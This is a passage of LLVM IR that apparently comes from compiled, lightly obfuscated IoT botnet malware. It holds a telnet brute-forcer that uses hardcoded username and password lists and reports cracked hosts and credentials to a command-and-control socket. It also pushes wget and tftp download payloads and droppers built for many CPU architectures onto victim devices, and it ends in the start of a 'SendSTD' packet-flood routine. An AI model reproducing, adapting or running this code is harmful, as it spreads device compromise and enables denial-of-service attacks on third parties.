  %822 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %821
  %823 = load i8*, i8** %822, align 8
  %824 = load i32, i32* %6, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 5
  %828 = load i8, i8* %827, align 1
  %829 = zext i8 %828 to i64
  %830 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %829
  %831 = load i8*, i8** %830, align 8
  %832 = call i32 (i32, i8*, ...) @sockprintf(i32 %807, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.284, i32 0, i32 0), i8* %815, i8* %823, i8* %831)
  %833 = load i32, i32* %6, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 0
  %837 = load i32, i32* %836, align 16
  %838 = load i8*, i8** @wgetpayload, align 8
  %839 = load i8*, i8** @wgetpayload, align 8
  %840 = call i64 @strlen(i8* %839) #9
  %841 = call i64 @send(i32 %837, i8* %838, i64 %840, i32 16384)
  %842 = icmp slt i64 %841, 0
  br i1 %842, label %843, label %847

; <label>:843:                                    ; preds = %806
  %844 = load i32, i32* %6, align 4
  %845 = sext i32 %844 to i64
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %845
  call void @reset_telstate(%struct.telstate_t* %846)
  br label %1218

; <label>:847:                                    ; preds = %806
  %848 = load i32, i32* %6, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %849
  call void @advance_telstate(%struct.telstate_t* %850, i32 16)
  br label %1217

; <label>:851:                                    ; preds = %100
  %852 = load i32, i32* @mainCommSock, align 4
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 1
  %857 = bitcast i32* %856 to %struct.in_addr*
  %858 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %857, i32 0, i32 0
  %859 = load i32, i32* %858, align 4
  %860 = call i8* @inet_ntoa(i32 %859) #5
  %861 = load i32, i32* %6, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 4
  %865 = load i8, i8* %864, align 2
  %866 = zext i8 %865 to i64
  %867 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %866
  %868 = load i8*, i8** %867, align 8
  %869 = load i32, i32* %6, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 5
  %873 = load i8, i8* %872, align 1
  %874 = zext i8 %873 to i64
  %875 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %874
  %876 = load i8*, i8** %875, align 8
  %877 = call i32 (i32, i8*, ...) @sockprintf(i32 %852, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.285, i32 0, i32 0), i8* %860, i8* %868, i8* %876)
  %878 = load i32, i32* %6, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 0
  %882 = load i32, i32* %881, align 16
  %883 = load i8*, i8** @tftppayload, align 8
  %884 = load i8*, i8** @tftppayload, align 8
  %885 = call i64 @strlen(i8* %884) #9
  %886 = call i64 @send(i32 %882, i8* %883, i64 %885, i32 16384)
  %887 = icmp slt i64 %886, 0
  br i1 %887, label %888, label %892

; <label>:888:                                    ; preds = %851
  %889 = load i32, i32* %6, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %890
  call void @reset_telstate(%struct.telstate_t* %891)
  br label %1218

; <label>:892:                                    ; preds = %851
  %893 = load i32, i32* %6, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %894
  call void @advance_telstate(%struct.telstate_t* %895, i32 16)
  br label %1217

; <label>:896:                                    ; preds = %100
  %897 = load i32, i32* @mainCommSock, align 4
  %898 = load i32, i32* %6, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 1
  %902 = bitcast i32* %901 to %struct.in_addr*
  %903 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %902, i32 0, i32 0
  %904 = load i32, i32* %903, align 4
  %905 = call i8* @inet_ntoa(i32 %904) #5
  %906 = load i32, i32* %6, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 4
  %910 = load i8, i8* %909, align 2
  %911 = zext i8 %910 to i64
  %912 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %911
  %913 = load i8*, i8** %912, align 8
  %914 = load i32, i32* %6, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 5
  %918 = load i8, i8* %917, align 1
  %919 = zext i8 %918 to i64
  %920 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %919
  %921 = load i8*, i8** %920, align 8
  %922 = call i32 (i32, i8*, ...) @sockprintf(i32 %897, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.286, i32 0, i32 0), i8* %905, i8* %913, i8* %921)
  store i32 0, i32* %29, align 4
  store i32 0, i32* %29, align 4
  br label %923

; <label>:923:                                    ; preds = %1177, %896
  %924 = load i32, i32* %29, align 4
  %925 = icmp slt i32 %924, 1
  br i1 %925, label %926, label %1183

; <label>:926:                                    ; preds = %923
  %927 = load i32, i32* %6, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 0
  %931 = load i32, i32* %930, align 16
  %932 = load i32, i32* %29, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_mips, i64 0, i64 %933
  %935 = load i8*, i8** %934, align 8
  %936 = call i32 (i32, i8*, ...) @sockprintf(i32 %931, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %935)
  %937 = icmp slt i32 %936, 0
  br i1 %937, label %938, label %942

; <label>:938:                                    ; preds = %926
  %939 = load i32, i32* %6, align 4
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %940
  call void @reset_telstate(%struct.telstate_t* %941)
  br label %1177

; <label>:942:                                    ; preds = %926
  %943 = load i32, i32* %6, align 4
  %944 = sext i32 %943 to i64
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %944
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %945, i32 0, i32 0
  %947 = load i32, i32* %946, align 16
  %948 = load i32, i32* %29, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_mipsel, i64 0, i64 %949
  %951 = load i8*, i8** %950, align 8
  %952 = call i32 (i32, i8*, ...) @sockprintf(i32 %947, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %951)
  %953 = icmp slt i32 %952, 0
  br i1 %953, label %954, label %958

; <label>:954:                                    ; preds = %942
  %955 = load i32, i32* %6, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %956
  call void @reset_telstate(%struct.telstate_t* %957)
  br label %1177

; <label>:958:                                    ; preds = %942
  %959 = load i32, i32* %6, align 4
  %960 = sext i32 %959 to i64
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 0
  %963 = load i32, i32* %962, align 16
  %964 = load i32, i32* %29, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_sh4, i64 0, i64 %965
  %967 = load i8*, i8** %966, align 8
  %968 = call i32 (i32, i8*, ...) @sockprintf(i32 %963, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %967)
  %969 = icmp slt i32 %968, 0
  br i1 %969, label %970, label %974

; <label>:970:                                    ; preds = %958
  %971 = load i32, i32* %6, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %972
  call void @reset_telstate(%struct.telstate_t* %973)
  br label %1177

; <label>:974:                                    ; preds = %958
  %975 = load i32, i32* %6, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 0
  %979 = load i32, i32* %978, align 16
  %980 = load i32, i32* %29, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_x86_64, i64 0, i64 %981
  %983 = load i8*, i8** %982, align 8
  %984 = call i32 (i32, i8*, ...) @sockprintf(i32 %979, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %983)
  %985 = icmp slt i32 %984, 0
  br i1 %985, label %986, label %990

; <label>:986:                                    ; preds = %974
  %987 = load i32, i32* %6, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %988
  call void @reset_telstate(%struct.telstate_t* %989)
  br label %1177

; <label>:990:                                    ; preds = %974
  %991 = load i32, i32* %6, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 0
  %995 = load i32, i32* %994, align 16
  %996 = load i32, i32* %29, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv6l, i64 0, i64 %997
  %999 = load i8*, i8** %998, align 8
  %1000 = call i32 (i32, i8*, ...) @sockprintf(i32 %995, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %999)
  %1001 = icmp slt i32 %1000, 0
  br i1 %1001, label %1002, label %1006

; <label>:1002:                                   ; preds = %990
  %1003 = load i32, i32* %6, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1004
  call void @reset_telstate(%struct.telstate_t* %1005)
  br label %1177

; <label>:1006:                                   ; preds = %990
  %1007 = load i32, i32* %6, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 0
  %1011 = ptrtoint i32* %1010 to i32
  %1012 = load i32, i32* %29, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_i686, i64 0, i64 %1013
  %1015 = load i8*, i8** %1014, align 8
  %1016 = call i32 (i32, i8*, ...) @sockprintf(i32 %1011, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1015)
  %1017 = icmp slt i32 %1016, 0
  br i1 %1017, label %1018, label %1022

; <label>:1018:                                   ; preds = %1006
  %1019 = load i32, i32* %6, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1020
  call void @reset_telstate(%struct.telstate_t* %1021)
  br label %1177

; <label>:1022:                                   ; preds = %1006
  %1023 = load i32, i32* %6, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1024
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1025, i32 0, i32 0
  %1027 = ptrtoint i32* %1026 to i32
  %1028 = load i32, i32* %29, align 4
  %1029 = sext i32 %1028 to i64
  %1030 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_powerpc, i64 0, i64 %1029
  %1031 = load i8*, i8** %1030, align 8
  %1032 = call i32 (i32, i8*, ...) @sockprintf(i32 %1027, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1031)
  %1033 = icmp slt i32 %1032, 0
  br i1 %1033, label %1034, label %1038

; <label>:1034:                                   ; preds = %1022
  %1035 = load i32, i32* %6, align 4
  %1036 = sext i32 %1035 to i64
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1036
  call void @reset_telstate(%struct.telstate_t* %1037)
  br label %1177

; <label>:1038:                                   ; preds = %1022
  %1039 = load i32, i32* %6, align 4
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1040
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1041, i32 0, i32 0
  %1043 = ptrtoint i32* %1042 to i32
  %1044 = load i32, i32* %29, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_i586, i64 0, i64 %1045
  %1047 = load i8*, i8** %1046, align 8
  %1048 = call i32 (i32, i8*, ...) @sockprintf(i32 %1043, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1047)
  %1049 = icmp slt i32 %1048, 0
  br i1 %1049, label %1050, label %1054

; <label>:1050:                                   ; preds = %1038
  %1051 = load i32, i32* %6, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1052
  call void @reset_telstate(%struct.telstate_t* %1053)
  br label %1177

; <label>:1054:                                   ; preds = %1038
  %1055 = load i32, i32* %6, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 0
  %1059 = ptrtoint i32* %1058 to i32
  %1060 = load i32, i32* %29, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_m68k, i64 0, i64 %1061
  %1063 = load i8*, i8** %1062, align 8
  %1064 = call i32 (i32, i8*, ...) @sockprintf(i32 %1059, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1063)
  %1065 = icmp slt i32 %1064, 0
  br i1 %1065, label %1066, label %1070

; <label>:1066:                                   ; preds = %1054
  %1067 = load i32, i32* %6, align 4
  %1068 = sext i32 %1067 to i64
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1068
  call void @reset_telstate(%struct.telstate_t* %1069)
  br label %1177

; <label>:1070:                                   ; preds = %1054
  %1071 = load i32, i32* %6, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1072
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1073, i32 0, i32 0
  %1075 = ptrtoint i32* %1074 to i32
  %1076 = load i32, i32* %29, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_sparc, i64 0, i64 %1077
  %1079 = load i8*, i8** %1078, align 8
  %1080 = call i32 (i32, i8*, ...) @sockprintf(i32 %1075, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1079)
  %1081 = icmp slt i32 %1080, 0
  br i1 %1081, label %1082, label %1086

; <label>:1082:                                   ; preds = %1070
  %1083 = load i32, i32* %6, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1084
  call void @reset_telstate(%struct.telstate_t* %1085)
  br label %1177

; <label>:1086:                                   ; preds = %1070
  %1087 = load i32, i32* %6, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 0
  %1091 = ptrtoint i32* %1090 to i32
  %1092 = load i32, i32* %29, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv4l, i64 0, i64 %1093
  %1095 = load i8*, i8** %1094, align 8
  %1096 = call i32 (i32, i8*, ...) @sockprintf(i32 %1091, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1095)
  %1097 = icmp slt i32 %1096, 0
  br i1 %1097, label %1098, label %1102

; <label>:1098:                                   ; preds = %1086
  %1099 = load i32, i32* %6, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1100
  call void @reset_telstate(%struct.telstate_t* %1101)
  br label %1177

; <label>:1102:                                   ; preds = %1086
  %1103 = load i32, i32* %6, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 0
  %1107 = load i32, i32* %1106, align 16
  %1108 = load i32, i32* %29, align 4
  %1109 = sext i32 %1108 to i64
  %1110 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv5l, i64 0, i64 %1109
  %1111 = load i8*, i8** %1110, align 8
  %1112 = call i32 (i32, i8*, ...) @sockprintf(i32 %1107, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1111)
  %1113 = icmp slt i32 %1112, 0
  br i1 %1113, label %1114, label %1118

; <label>:1114:                                   ; preds = %1102
  %1115 = load i32, i32* %6, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1116
  call void @reset_telstate(%struct.telstate_t* %1117)
  br label %1177

; <label>:1118:                                   ; preds = %1102
  %1119 = load i32, i32* %6, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 16
  %1124 = load i8*, i8** @dropper_powerpc440fp, align 8
  %1125 = load i32, i32* %29, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds i8, i8* %1124, i64 %1126
  %1128 = load i8, i8* %1127, align 1
  %1129 = sext i8 %1128 to i32
  %1130 = call i32 (i32, i8*, ...) @sockprintf(i32 %1123, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i32 %1129)
  %1131 = icmp slt i32 %1130, 0
  br i1 %1131, label %1132, label %1136

; <label>:1132:                                   ; preds = %1118
  %1133 = load i32, i32* %6, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1134
  call void @reset_telstate(%struct.telstate_t* %1135)
  br label %1177

; <label>:1136:                                   ; preds = %1118
  %1137 = load i32, i32* @mainCommSock, align 4
  %1138 = load i32, i32* %6, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 1
  %1142 = bitcast i32* %1141 to %struct.in_addr*
  %1143 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1142, i32 0, i32 0
  %1144 = load i32, i32* %1143, align 4
  %1145 = call i8* @inet_ntoa(i32 %1144) #5
  %1146 = load i32, i32* %6, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 4
  %1150 = load i8, i8* %1149, align 2
  %1151 = zext i8 %1150 to i64
  %1152 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1151
  %1153 = load i8*, i8** %1152, align 8
  %1154 = load i32, i32* %6, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 5
  %1158 = load i8, i8* %1157, align 1
  %1159 = zext i8 %1158 to i64
  %1160 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1159
  %1161 = load i8*, i8** %1160, align 8
  %1162 = call i32 (i32, i8*, ...) @sockprintf(i32 %1137, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.288, i32 0, i32 0), i8* %1145, i8* %1153, i8* %1161)
  br label %1163

; <label>:1163:                                   ; preds = %1136
  br label %1164

; <label>:1164:                                   ; preds = %1163
  br label %1165

; <label>:1165:                                   ; preds = %1164
  br label %1166

; <label>:1166:                                   ; preds = %1165
  br label %1167

; <label>:1167:                                   ; preds = %1166
  br label %1168

; <label>:1168:                                   ; preds = %1167
  br label %1169

; <label>:1169:                                   ; preds = %1168
  br label %1170

; <label>:1170:                                   ; preds = %1169
  br label %1171

; <label>:1171:                                   ; preds = %1170
  br label %1172

; <label>:1172:                                   ; preds = %1171
  br label %1173

; <label>:1173:                                   ; preds = %1172
  br label %1174

; <label>:1174:                                   ; preds = %1173
  br label %1175

; <label>:1175:                                   ; preds = %1174
  %1176 = call i32 @sleep(i32 1)
  br label %1177

; <label>:1177:                                   ; preds = %1175, %1132, %1114, %1098, %1082, %1066, %1050, %1034, %1018, %1002, %986, %970, %954, %938
  %1178 = load i32, i32* %29, align 4
  %1179 = sub i32 %1178, 1513546570
  %1180 = add i32 %1179, 1
  %1181 = add i32 %1180, 1513546570
  %1182 = add nsw i32 %1178, 1
  store i32 %1181, i32* %29, align 4
  br label %923

; <label>:1183:                                   ; preds = %923
  %1184 = load i32, i32* %6, align 4
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1185
  call void @advance_telstate(%struct.telstate_t* %1186, i32 16)
  br label %1217

; <label>:1187:                                   ; preds = %100
  %1188 = load i32, i32* @mainCommSock, align 4
  %1189 = load i32, i32* %6, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 1
  %1193 = bitcast i32* %1192 to %struct.in_addr*
  %1194 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1193, i32 0, i32 0
  %1195 = load i32, i32* %1194, align 4
  %1196 = call i8* @inet_ntoa(i32 %1195) #5
  %1197 = load i32, i32* %6, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 4
  %1201 = load i8, i8* %1200, align 2
  %1202 = zext i8 %1201 to i64
  %1203 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1202
  %1204 = load i8*, i8** %1203, align 8
  %1205 = load i32, i32* %6, align 4
  %1206 = sext i32 %1205 to i64
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1206
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1207, i32 0, i32 5
  %1209 = load i8, i8* %1208, align 1
  %1210 = zext i8 %1209 to i64
  %1211 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1210
  %1212 = load i8*, i8** %1211, align 8
  %1213 = call i32 (i32, i8*, ...) @sockprintf(i32 %1188, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.289, i32 0, i32 0), i8* %1196, i8* %1204, i8* %1212)
  %1214 = load i32, i32* %6, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %1215
  call void @reset_telstate(%struct.telstate_t* %1216)
  br label %1217

; <label>:1217:                                   ; preds = %1187, %1183, %892, %847, %805, %740, %727, %690, %674, %640, %627, %521, %500, %442, %421, %367, %252, %100
  br label %1218

; <label>:1218:                                   ; preds = %1217, %888, %843, %736, %686, %636, %609, %517, %482, %438, %404, %345, %341, %214, %183, %170
  %1219 = load i32, i32* %6, align 4
  %1220 = add i32 %1219, 1697923657
  %1221 = add i32 %1220, 1
  %1222 = sub i32 %1221, 1697923657
  %1223 = add nsw i32 %1219, 1
  store i32 %1222, i32* %6, align 4
  br label %82

; <label>:1224:                                   ; preds = %82
  br label %80
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #5
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #5
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

; <label>:36:                                     ; preds = %58, %3
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %58

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.290, i32 0, i32 0), i64 69, i32 0)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = call i32 @connect(i32 %42, %struct.sockaddr* %43, i32 16)
  %45 = call i64 @time(i64* null) #5
  %46 = load i64, i64* %8, align 8
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = sub i64 %46, -4512290192007235823
